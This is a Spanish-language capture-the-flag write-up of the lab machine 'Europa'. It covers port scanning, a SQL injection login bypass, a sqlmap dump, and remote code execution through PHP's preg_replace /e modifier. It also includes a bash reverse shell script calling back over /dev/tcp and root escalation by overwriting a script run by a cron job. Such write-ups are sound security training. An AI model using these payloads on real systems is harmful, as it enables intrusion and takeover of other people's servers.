# Europa

Nuestro escaneo inicial nos muestra 3 puertos: 22, 80, 443.

```jsx
# Nmap 7.80 scan initiated Sat Oct 17 10:42:59 2020 as: nmap -sC -sV 10.10.10.22
Nmap scan report for 10.10.10.22
Host is up, received echo-reply ttl 63 (1.6s latency).
Scanned at 2020-10-17 10:42:59 -04 for 24s

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCh1/OK73CDKnJigk6uMUzDLSQhCHSpt9xL+SJrizWdCa7edGviU3NU/8So5xOOgzV1k8u3qHsudNnTSiH8Ek9d2c48B3xYHZn5+nPDv22fZ82LIRKd5qSLhthk91bL3uV+/CURpOZshvo0bVPS48UQaw5r7pWTE0goB+qyG2csY7hr3+9C7Sx4L/Vx7MOFuGAoy/EnpHG10f12ZJ6IVrX8mMEyZGb3Bh7crRN8tQ2RAvnJxyj+1ZeDo7Vr2F75r//dEL2iQ4S2Iuz8BocjQMREyIguIOSOJxjc/L52TpioRHnNK/aEArT02uakB4jRyd5LTSsijjitgUlAk/3H2cYd
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEqrLpdz7aDIUDy3bslqFlbGCrL4Q6tQmesbTP73F/Rv0GO6bb3zHETnZwVB5AKes/pQdRrbDlQCtR2v2WsTXsw=
|   256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDE2hVC32u7eNINSvsmSQkbMlUkJ7s0oiG/bxPhwZb/b
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=admin@europacorp.htb/localityName=Athens/organizationalUnitName=IT
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Issuer: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR/emailAddress=admin@europacorp.htb/localityName=Athens/organizationalUnitName=IT
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-04-19T09:06:22
| Not valid after:  2027-04-17T09:06:22
| MD5:   35d5 1c04 7ae8 0f5c 35a0 bc49 53e5 d085
| SHA-1: ced9 8f01 1228 e35d 83d3 2634 b4c1 ed52 b917 3335
| -----BEGIN CERTIFICATE-----
| MIIFSDCCA7CgAwIBAgIJAPGhMP4FtiTCMA0GCSqGSIb3DQEBCwUAMIGUMQswCQYD
| VQQGEwJHUjEPMA0GA1UECAwGQXR0aWNhMQ8wDQYDVQQHDAZBdGhlbnMxGDAWBgNV
| BAoMD0V1cm9wYUNvcnAgTHRkLjELMAkGA1UECwwCSVQxFzAVBgNVBAMMDmV1cm9w
| YWNvcnAuaHRiMSMwIQYJKoZIhvcNAQkBFhRhZG1pbkBldXJvcGFjb3JwLmh0YjAe
| Fw0xNzA0MTkwOTA2MjJaFw0yNzA0MTcwOTA2MjJaMIGUMQswCQYDVQQGEwJHUjEP
| MA0GA1UECAwGQXR0aWNhMQ8wDQYDVQQHDAZBdGhlbnMxGDAWBgNVBAoMD0V1cm9w
| YUNvcnAgTHRkLjELMAkGA1UECwwCSVQxFzAVBgNVBAMMDmV1cm9wYWNvcnAuaHRi
| MSMwIQYJKoZIhvcNAQkBFhRhZG1pbkBldXJvcGFjb3JwLmh0YjCCAaIwDQYJKoZI
| hvcNAQEBBQADggGPADCCAYoCggGBAKzVzRrrM1MSWnf8zniIPKt0SXGDB2msYUm3
| rQJ3j31wPfn9xJOWeIpBCIbtXkRqO3XGrLjG/M0Slp3sa/lQ+1dk8aupaudrJvCm
| ITzLnGvtzrtyDlPkozH2wqM+tJx351gKhfrdF81TItS8oe3yskPW3MvEDbi5lPQM
| OVZk4dhFT4l94E1zrRoapU9fqNL66BdEzeEdS6XwntdARBrEyEoCp7nFIGMBKSIn
| JzxIh2VS98ybxkw58QcDEG9ClDH49nglkKmQfAevGKil8f1f9NYRwW3YOCvuzAA7
| Osg+pLEp4de6MEf408+AOhxl4CvgZKYWvmu7b+OSrFDN8cHFy/bQ2fvrjXNazjA0
| 9FIj4wivJ7JgJOCdXEianNZkvLzqPXGS/dVUrFF5fzyG0z5xOTvABZp86fNa3yNu
| zLb04h3j04SvfJ+T3CzkZDWVsFvOYdKsce600S/iaUoqE7XQH6QPB54ba5ailVtH
| npmV1uVqVxT7tXAs0ztIDpqzJ0XAnwIDAQABo4GaMIGXMB0GA1UdDgQWBBSdw09g
| /iRsaKt8R137PRpTAfuTgTA6BgNVHREEMzAxghJ3d3cuZXVyb3BhY29ycC5odGKC
| G2FkbWluLXBvcnRhbC5ldXJvcGFjb3JwLmh0YjAfBgNVHSMEGDAWgBSdw09g/iRs
| aKt8R137PRpTAfuTgTAMBgNVHRMEBTADAQH/MAsGA1UdDwQEAwIFoDANBgkqhkiG
| 9w0BAQsFAAOCAYEAbv2ccFD/d2ovr3dkIqL1m2Qo3AgMObUaBczB37KDsB0w6lzf
| EOM/aBVth8LarblnVUJE0tk8Io7VBcTP9hF2nt3BuSM0mF6yMY3WRY+23JJpNxSO
| nOrZ1xLB7a6XTwSTWD0kg2bRbjSbiEWaUzY/RrqtCF1NThgyXo0wuMWPpPICmbd/
| 5ID8iOH+rmR3nR4fP80J38SUmvrsXAmifbsbKaKHspNMclQ2Idfiyv53xAoFrJzV
| cuxHKyBxYn8A5DPRIhbesLF2NAy0d4aziNeVgGQnSA9cV9RhN454nuzwqKb33BlF
| L8cpG59w3xR8RuyTyZql4uBPZtogzh0pc0PyxX2E2O5nbn85aqYDkVW7aUkeiU69
| LAiIp8s6Z+Rhe2rN4RAudtMcWaMTwjBOb1k1UrJ+0T7Av3O5nJk5kd/Ee5LUD2jX
| wE9Q72WLg1HP/PSSJPsNASSAW4OWSYG1CqLIhfRk5wJtfi6oR9VO+CpajWvqB0Ej
| PTXIrDgdEK1VKan9
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 17 10:43:23 2020 -- 1 IP address (1 host up) scanned in 24.84 seconds
```

El resultado nos muestra 2 entradas interesantes `www.europacorp.htb` y `admin-portal.europacorp.htb`. Procedemos a añadir ambas  en `/etc/hosts`

Cuando intentamos acceder a estos hosts mediante el puerto 80 nos tocamos con la página por defecto de apache. Entonces intentamos acceder al puerto 443 y nos encontramos con un login al momento de acceder el subdominio de `admin-portal`

![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled.png)

## Obteniendo RCE

Podemos probar rápidamente si hay SQLi con varios payloads y combinaciones de credenciales. Como nos pide un correo en vez de simplemente un usuario, por eso intentamos darle con `admin@europacorp.htb`  y vemos que comentando el resto del query colocando lo siguiente como email`admin@europacorp.htb' #`   podemos hacer bypass del login

También podemos intentar con SQLmap para confirmar posibles casos de inyección (cosa que ya hemos hecho manualmente) y dumpear el resto de la base de datos. Esto lo hacemos con el siguiente comando:

```bash
sqlmap -u [https://admin-portal.europacorp.htb/login.php](https://admin-portal.europacorp.htb/login.php) --form --batch --dump
```

Luego de correr sqlmap para asistirnos en la inyección obtenemos la siguiente información de la base de datos.

![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%201.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%201.png)

Una vez obtenemos los hashes observamos que son idénticos y que contienen 32 caracteres de longitud. Procedemos a verificarlos en [hashes.com](http://hashes.com) para confirmar si obtenemos su resultado en texto plano. Y obtenemos un resultado válido.

![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%202.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%202.png)

Estas credenciales quizá nos sirvan para ser usadas una vez tengamos ejecución de comandos de manera arbitratia en la máquina, pero por ahora procedemos a examinar el site.

![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%203.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%203.png)

Si vamos a la opción de Tools nos encontramos con un generador de configuraciones de OpenVPN

![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%204.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%204.png)

En primera instancia pensé en obtener una reverse shell abusando la funcionalidad de OpenVPN mediante el parámetro up. Debajo está un artículo explicando cómo esto puede ser ejecutado.

[Reverse Shell from an OpenVPN Configuration File](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da)

Pero no funcionó con el propósito que esperaba. 

Luego de esto empecé a examinar los requests que se mandaban al site y a analizar la funcionalidad del generador. Vemos que remplaza lo que sea que le pasemos como parametro de IP dentro de la configuración y revisando uno de los requests que se han capturado vemos el parametro "pattern". 

Luego de googlear (literalmente) "php pattern exploit", encontramos este site [http://www.madirish.net/402](http://www.madirish.net/402) que nos brinda la idea de usar  `/^(.*)/e` como pattern y  luego pasarle el string de `"system('CMD')"` . En este caso colocamos nuestro payload en el archivo `[reverse.sh](http://reverse.sh)` y lo servimos mediante el módulo de http.server en python `python3 -m http.server 80`

```bash
$ cat reverse.sh 
/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"
```

Interceptamos el request y añadimos nuestro payload para obtener el script `[reverse.sh](http://reverse.sh)` y ejecutarlo, recordando darle codificación de URL

![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%205.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%205.png)

Revisamos nuestro listener y confirmamos que tenemos una reverse shell!

Procedemos a mejorarla solamente con `python3 -c 'import pty;pty.spawn("/bin/bash")'`
ya que la hemos capturado con `rlwrap`. A pesar de que somos www-data podemos leer la flag de user. Esta se encuentra en /home/john/user.txt.

## Consigamos ser root

Examinando los directorios del usuario www-data encontramos uno particular que nos llama la atención y a su vez un archivo muy particular.

![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%206.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%206.png)

Aquí vemos el contenido del archivo `clearlogs`

```bash
$ cat clearlogs
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
```

Asumiendo por el nombre del directorio (cronjobs), hay una tarea programada a ejecutarse para limpiar los logs del site, pero a su vez este ejecuta un archivo llamado `[logcleared.sh](http://logcleared.sh)`.  Tenemos permiso de escritura en la ruta en el cual se encuentra el archivo por lo cual procedemos a colocar el siguiente payload para confirmar si podemos obtener una reverse shell como root .

Podemos usar el mismo `[reverse.sh](http://reverse.sh)` para obtener la shell como root. Solo tenemos que moverlo a la ruta y renombrarlo

```bash
$ mv reverse.sh logcleared.sh
```

Luego de unos minutos, revisamos nuestro listener y....

![Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%207.png](Europa%20d794c8c2e323416cb3555479d3f5840c/Untitled%207.png)

Somos root!